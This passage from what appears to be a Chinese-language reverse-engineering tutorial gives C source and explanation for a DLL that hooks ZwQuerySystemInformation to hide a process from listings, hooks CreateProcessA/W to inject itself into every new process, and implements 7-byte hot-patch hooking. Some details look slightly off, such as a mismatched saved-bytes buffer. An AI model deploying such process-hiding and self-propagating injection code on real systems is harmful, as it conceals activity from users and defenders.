                        pPrev = pCur; //没有匹配到则向下推进
                }
                if (pCur->NextEntryOffset == 0) //遍历到结尾则退出
                    break;
                pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur->NextEntryOffset); //将当前的pCur移动至下一个节点
            }
        }
    __NTQUERYSYSTEMINFORMATION_END:
        // 函数终止前，再次执行API钩取操作，为下次调用准备
        hook_code("ntdll.dll", "ZwQuerySystemInformation", (PROC)NewZwQuerySystemInformation, g_OrgByteZwQSI);
        return status;
    }
    BOOL WINAPI NewCreateProcessA(
        LPCTSTR lpApplicationName,
        LPTSTR lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL bInheritHandles,
        DWORD dwCreationFlags,
        LPVOID lpEnvironment,
        LPCTSTR lpCurrentDirectory,
        LPSTARTUPINFO lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
    )
    {
        BOOL bRet;
        FARPROC pFunc = NULL;
        unhook_code("kernel32.dll", "CreateProcessA", g_OrgByteCPA); //先进行脱钩
        pFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessA");
        bRet = ((PFCREATEPROCESSA)pFunc)(
            lpApplicationName,
            lpCommandLine,
            lpProcessAttributes,
            lpThreadAttributes,
            bInheritHandles,
            dwCreationFlags,
            lpEnvironment,
            lpCurrentDirectory,
            lpStartupInfo,
            lpProcessInformation
            ); //重新调用CreateProcessA
        if (bRet) //向新创建的进程再次注入DLL
        {
            inject(lpProcessInformation->hProcess, INJECT_DLL);
        }
        hook_code("kernel32.dll", "CreateProcessA", (PROC)NewCreateProcessA, g_OrgByteCPA);
        return bRet;
    }
    BOOL WINAPI NewCreateProcessW(
        LPCTSTR lpApplicationName,
        LPTSTR lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL bInheritHandles,
        DWORD dwCreationFlags,
        LPVOID lpEnvironment,
        LPCTSTR lpCurrentDirectory,
        LPSTARTUPINFO lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
    )
    {
        BOOL bRet;
        FARPROC pFunc = NULL;
        unhook_code("kernel32.dll", "CreateProcessW", g_OrgByteCPA); //先进行脱钩
        pFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessW");
        bRet = ((PFCREATEPROCESSW)pFunc)(
            lpApplicationName,
            lpCommandLine,
            lpProcessAttributes,
            lpThreadAttributes,
            bInheritHandles,
            dwCreationFlags,
            lpEnvironment,
            lpCurrentDirectory,
            lpStartupInfo,
            lpProcessInformation
            ); //重新调用CreateProcessW
        if (bRet) //向新创建的进程再次注入DLL
        {
            inject(lpProcessInformation->hProcess, INJECT_DLL); //CreateProcess创建的进程中lpProcessInformation这个参数中包含了对应进程的句柄
        }
        hook_code("kernel32.dll", "CreateProcessW", (PROC)NewCreateProcessW, g_OrgByteCPW);
        return bRet;
    }
    BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD  ul_reason_for_call,
        LPVOID lpReserved
    )
    {
        char szCurentProcName[MAX_PATH] = { 0, };
        char* p = NULL;
        EnableDebugPriv();
        GetModuleFileNameA(NULL, szCurentProcName, MAX_PATH);
        //1.异常处理：如果当前进程名字为HideProc.exe（即注入程序），则终止，不进行钩取。
        p = strrchr(szCurentProcName, '\\'); //获得当前进程的应用程序名
        if (p != NULL && !_stricmp(p + 1, "HideProc2.exe"))
            return TRUE;
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH: //进行API钩取
            hook_code("ntdll.dll", "ZwQuerySystemInformation", (PROC)NewZwQuerySystemInformation, g_OrgByteZwQSI);
            hook_code("kernel32.dll", "CreateProcessA", (PROC)NewCreateProcessA, g_OrgByteCPA);
            hook_code("kernel32.dll", "CreateProcessW", (PROC)NewCreateProcessW, g_OrgByteCPW);
            break;
        case DLL_PROCESS_DETACH: //将API进行脱钩，恢复其原始形态
            unhook_code("ntdll.dll", "ZwQuerySystemInformation",g_OrgByteZwQSI);
            unhook_code("kernel32.dll", "CreateProcessA", g_OrgByteCPA);
            unhook_code("kernel32.dll", "CreateProcessW", g_OrgByteCPW);
            break;
        }
        return TRUE;
    }
程序的大体逻辑没有发生改变，主要是多出了有关CreateProcessA/W钩取的部分，以及部分操作的更改：
  1. 挂钩函数（hook_code）
  2. 脱钩函数（unhook_code）
  3. 钩取后重定义的目标API函数1（NewZwQuerySystemInformation）
  4. 钩取重定义后的目标API函数2（NewCreateProcessA\W）
  5. 进行挂钩和脱钩的主函数（DllMain）
下面对其中比较重要的部分进行分析
## NewCreateProcessA\W：
在新的源码中最为重要的就是有关CreateProcess函数的钩取。
函数的功能是创建一个新进程及其主线程。原始API函数的结构如下：
    BOOL CreateProcessA(
      [in, optional]      LPCSTR                lpApplicationName,
      [in, out, optional] LPSTR                 lpCommandLine,
      [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
      [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
      [in]                BOOL                  bInheritHandles,
      [in]                DWORD                 dwCreationFlags,
      [in, optional]      LPVOID                lpEnvironment,
      [in, optional]      LPCSTR                lpCurrentDirectory,
      [in]                LPSTARTUPINFOA        lpStartupInfo,
      [out]               LPPROCESS_INFORMATION lpProcessInformation
    );
A\W版本的对应变化不打，主要是使用的字符编码问题，所以在源码中进行的相应操作也相差不大。
# 7字节钩取：
下面介绍一种新的钩取方式：7字节钩取，又称 **热补丁技术** 。
首先来看一下几个API的其实代码部分：
RtReleasePath：
RtlReleaseSRWLockExclusive：
可以发现这些API都有一个共同点：
函数的起始位置以及其前面5个字节的结构是固定的：
    int3
    int3
    int3
    int3
    int3
    mov edi,edi
也就是5个空指令以及一个mov
edi,edi，总共7字节大小的部分结构是固定的，且这7个字节的指令无论如何更改都是对原本API函数的运行流程没有影响的。Windows这样设计的目的就是为了方便在后面进行热补丁修改。
那么要如何利用这7个字节呢？一般是通过一个长跳转与一个短跳转结合来实现的。
首先将mov edi,edi这条指令的两个字节更改为EB
F9，这是一个短跳转指令，F9是-7的补码表现形式，也就是说，将这个指令更改为向前跳转7个字节，也就是5个空指令开始的地方（短跳转范围是-128到127）。
然后，由于空指令的长度是5个字节，刚好满足一个无条件跳转指令的长度（即JMP XXXXXX指令），所以可以在这里设置将程序的执行流劫持到自定义函数上。
这个方法相较于前面的5字节钩取，就是原API函数的实际运行部分没有收到任何影响，所以在
**后续的调用中可以直接调用原始API函数而不用再次进行麻烦的脱钩及挂钩操作，而是直接将函数的起始位置更改为原起始位置的+2字节处即可。**
这个方法虽然直观上看起来是比5字节钩取更好的，但是它的运用范围并没有5字节钩取大，因为并不是每个API都可以使用7字节钩取，比如ntdll的原生API。所以在本次操作中的ZwQuerySystemInformation依然使用5字节钩取，但属于kernel32.dll的CreateProcess就可以使用7字节钩取。
# stealth3.dll：
首先还是先给出具体的源码及注释：
    #include "windows.h"
    #include "tchar.h"
    #include "stdio.h"
    #define INJECT_DLL (L"stealth3.dll")
    #define PROC_TO_HIDE (L"notepad.exe")
    #define STATUS_SUCCESS (0x00000000L) //NTSTATUS中表示成功的数值为0
    BYTE g_OrgByteZwQSI[5] = { 0, };
    typedef enum _SYSTEM_INFORMATION_CLASS {
        SystemBasicInformation = 0,
        SystemPerformanceInformation = 2,
        SystemTimeOfDayInformation = 3,
        SystemProcessInformation = 5,
        SystemProcessorPerformanceInformation = 8,
        SystemInterruptInformation = 23,
        SystemExceptionInformation = 33,
        SystemRegistryQuotaInformation = 37,
        SystemLookasideInformation = 45
    } SYSTEM_INFORMATION_CLASS;
    typedef struct _SYSTEM_PROCESS_INFORMATION {
        ULONG NextEntryOffset;
        ULONG NumberOfThreads;
        BYTE Reserved1[48];
        PVOID Reserved2[3];
        HANDLE UniqueProcessId;
        PVOID Reserved3;
        ULONG HandleCount;
        BYTE Reserved4[4];
        PVOID Reserved5[11];
        SIZE_T PeakPagefileUsage;
        SIZE_T PrivatePageCount;
        LARGE_INTEGER Reserved6[6];
    } SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;
    typedef NTSTATUS(WINAPI* PFZWQUERYSYSTEMINFORMATION) //关于ZwQuerySystemInformation函数的函数申明，后面会调用这个函数
    (SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength);
    typedef BOOL(WINAPI* PFCREATEPROCESSA)
    (
        LPCTSTR lpApplicationName,
        LPTSTR lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL bInheritHandles,
        DWORD dwCreationFlags,
        LPVOID lpEnvironment,
        LPCTSTR lpCurrentDirectory,
        LPSTARTUPINFO lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
        ); //CreateProcessA的函数声明
    typedef BOOL(WINAPI* PFCREATEPROCESSW)
    (
        LPCTSTR lpApplicationName,
        LPTSTR lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL bInheritHandles,
        DWORD dwCreationFlags,
        LPVOID lpEnvironment,
        LPCTSTR lpCurrentDirectory,
        LPSTARTUPINFO lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
        );  //CreateProcessW的函数声明
    BOOL hook_code_hotpatch(LPCSTR szDllName, LPCSTR szFuncName, PROC prNew) //挂钩函数
    {
        FARPROC pFunc = NULL;
        DWORD dwOldProtect = 0;
        DWORD dwAddress = 0;
        BYTE Buf[5] = { 0xE9,0, };
        byte buf2[2] = { 0xEB,0xF9 };
        PBYTE pByte = NULL;
        pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName); //获取原始API函数的地址
        pByte = (PBYTE)pFunc;
        if (pByte[0] == 0xEB) //判断是否已经处于钩取状态
            return FALSE;
        VirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, PAGE_EXECUTE_READWRITE, &dwOldProtect); //修改相应内存区域的读写执行权限
        dwAddress = (DWORD)prNew - (DWORD)pFunc; //由于跳转的起始位置是在原始API函数的起始位置向上5字节的地方，所以这里是没有-5的
        memcpy(&Buf[1], &dwAddress, 4);
        memcpy((LPVOID)((DWORD)pByte - 5), Buf, 5); //首先修改原API函数的前5个字节为相应的跳转指令
        memcpy(pFunc, buf2, 2); //再修改API函数开头位置上的第一条指令为短跳转，使程序的执行流被劫持到前面5个字节的长跳转指令上
        VirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, dwOldProtect, &dwOldProtect);
        return TRUE;
    }
    BOOL unhook_code_hotpatch(LPCSTR szDllName, LPCSTR szFuncName) //脱钩函数
    {
        FARPROC pFunc = NULL;
        DWORD dwOldProtect = 0;
        PBYTE pByte = NULL;
        byte Buf1[5] = { 0x90,0x90 ,0x90 ,0x90 ,0x90 }; //在API函数的起始位置的前5个字节为五个空指令
        byte Buf2[2] = { 0x8B,0xFF }; //API函数起始的一条指令即使mov edi,edi
        pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName); //获取 所需要钩取的API函数的原始地址
        pByte = (PBYTE)pFunc;
        if (pByte[0] != 0xEB) //判断是否已经处于脱钩状态
            return FALSE;
        VirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, PAGE_EXECUTE_READWRITE, &dwOldProtect);
        memcpy((LPVOID)((DWORD)pByte - 5), Buf1, 5); //还原原API函数的结构
        memcpy(pFunc, Buf2, 2);
        VirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, dwOldProtect, &dwOldProtect);
        return TRUE;
    }
    BOOL hook_code(LPCSTR szDllName, LPCSTR szFuncName, PROC prNew, PBYTE pOrgbyte) //挂钩函数